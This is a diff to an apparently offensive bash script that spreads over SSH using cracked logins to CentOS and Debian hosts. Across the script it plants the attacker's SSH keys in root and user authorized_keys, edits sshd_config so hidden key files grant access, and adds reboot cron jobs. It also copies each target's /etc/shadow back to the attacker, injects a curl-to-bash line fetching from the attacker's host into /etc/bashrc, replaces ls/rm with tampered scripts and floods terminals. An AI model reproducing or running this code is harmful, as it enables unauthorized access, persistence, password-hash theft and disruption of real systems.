@@ -13,6 +13,7 @@
 	# for centos (at least), change the WOULD YOU LIKE TO PLAY A GAME from 'wall' to pts/whatever
 	# checks for existing changes before reapplying them
 	# make rickroll "safer"
+	# faster timeouts
 	#******************************************************
 	#
 #///////////////////////////////////////////////////////////////////////////////////////
@@ -50,11 +51,17 @@ function payload(){			#
 #############################
 	#### Setting Defaults ############################
 	crackedLogins="./crackedLogins"
+	targetShadows="./shadows"
 	sshKey="/root/.ssh/id_rsa"
+	rickHostIP="$(hostname -I | tr -d ' '):8000"
 	#### Gathering Info ############################
 	# making key if there isn't one
 		if [ ! -e $sshKey ]; then
 			ssh-keygen -f $sshKey -t rsa -N ''
+		fi
+	# making targetShadows dir if it doesn't exist
+		if [ ! -e $targetShadows ];then
+			mkdir -p $targetShadows
 		fi
 #+++++++++++++++
 # single target
@@ -68,7 +75,7 @@ function payload(){			#
 		password="$(echo $tango | cut -d" " -f3 || $3)"
 			: ${password:=$3}
 
-		sshLoginCommand="sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target"
+		sshLoginCommand="sshpass -p $password ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no $username@$target"
 		sshUserPath="/home/$username/.ssh"
 		sshUserKey="$sshUserPath/authorized_keys"
 		sshRootPath="/root/.ssh"
@@ -94,24 +101,28 @@ function payload(){			#
 											sudo tee -a $sshUserKey $sshRootKey
 											" </root/.ssh/id_rsa.pub &> /dev/null
 						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
-							printf "\nPoisoning sshd rules on [$target]\n"
-							ssh $target "
-										mkdir $sshPoisonPath
-										cp $sshRootKey $sshPoisonKey
-										sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
-										service sshd restart
-										" &
+							if [ $? == 0 ]; then
+								printf "\nPoisoning sshd rules on [$target]\n"
+								ssh $target "
+											mkdir $sshPoisonPath
+											cp $sshRootKey $sshPoisonKey
+											sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
+											service sshd restart
+											" &
+							fi
 						#payload
-							ssh $target "
-										touch /tmp/.trigger
-										echo '${dirtyLS}' | tee $seedPathsLS > /dev/null
-										echo '${dirtyRM}' | tee $seedPathsRM > /dev/null
-										chmod +x $seedPathsLS $seedPathsRM
-										chmod 777 $seedPathsLS $seedPathsRM
-										(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
-										at now +1 minute <<< 'init 6'
-										for n in {1..1000}; do wall -n 'WOULD YOU LIKE TO PLAY A GAME???'; sleep 0.1; done
-										" &
+							if [ $? == 0 ]; then
+								ssh $target "
+											touch /tmp/.trigger
+											echo '${dirtyLS}' | tee $seedPathsLS > /dev/null
+											echo '${dirtyRM}' | tee $seedPathsRM > /dev/null
+											chmod +x $seedPathsLS $seedPathsRM
+											chmod 777 $seedPathsLS $seedPathsRM
+											(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
+											at now +1 minute <<< 'init 6'
+											for n in {1..1000}; do wall -n 'WOULD YOU LIKE TO PLAY A GAME???'; sleep 0.1; done
+											" &
+							fi
 							;;
 				Debian)
 						#inserting key
@@ -139,7 +150,7 @@ function payload(){			#
 											echo $password | sudo -S chmod 600 $sshUserKey &> /dev/null
 											echo $password | sudo -S cp $sshUserKey $sshRootKey &> /dev/null
 											echo $password | sudo -S restorecon -r /root &> /dev/null
-											"</root/.ssh/id_rsa.pub
+											"</root/.ssh/id_rsa.pub &> /dev/null
 
 							# if sudo doesn't exist, sets up the key for normal user and lets you know.
 							if [ $? != 0 ]; then
@@ -148,31 +159,36 @@ function payload(){			#
 												mkdir -m700 -p $sshUserPath
 												chmod 600 $sshUserKey &> /dev/null || install -m 600 /dev/null $sshUserKey
 												cat >> $sshUserKey
-												" </root/.ssh/id_rsa.pub
+												" </root/.ssh/id_rsa.pub &> /dev/null
 							fi
 						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
 							if [ $? == 0 ]; then
 								printf "\nPoisoning sshd rules on [$target]\n"
-								ssh $target "
+								ssh -n $target "
 											mkdir $sshPoisonPath
 											cp $sshRootKey /root/.ssh/.authorized_keys
 											echo 'AuthorizedKeysFile2 .ssh/.authorized_keys' >> /etc/ssh/sshd_config
-											service sshd restart
 											" &
+							fi
+						#yanking back the shadow file
+							if [ $? == 0 ]; then
+								printf "\nYanking shadow file from [$target]"
+								ssh -n $target "
+											cat /etc/shadow
+											" &> $targetShadows/shadow-$target
 							fi
 						#let the bodies hit the floor
 							if [ $? == 0 ]; then
 								printf "\nLoosing the plague upon [$target]\n"
-								ssh $target "
+								ssh -n $target "
 											echo '${dirtyLS}' | tee $seedPathsLS > /dev/null
 											echo '${dirtyRM}' | tee $seedPathsRM > /dev/null
 											chmod +x $seedPathsLS $seedPathsRM
 											chmod 777 $seedPathsLS $seedPathsRM
 											touch /tmp/.trigger
-											(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
 											echo 'touch /tmp/.trigger &> /dev/null' >> /etc/bashrc
 											echo '$centDirtyRootPS1' >> /etc/bashrc
-											echo 'curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash' >> /etc/bashrc
+											echo 'curl -s -L '$rickHostIP'/roll.sh | bash' >> /etc/bashrc ;
 											for n in {1..100}; do
 												echo "WOULD YOU LIKE TO PLAY A GAME???" | tee /dev/hvc* /dev/tty* /dev/pts/*
 												sleep .15
@@ -226,7 +242,7 @@ function meat(){
 }
 
 ###########################################################################################
-#dirty PATH and scripts
+#dirty stuff
 ###########################################################################################
 centDirtyRootPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
 centPATH="/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin"
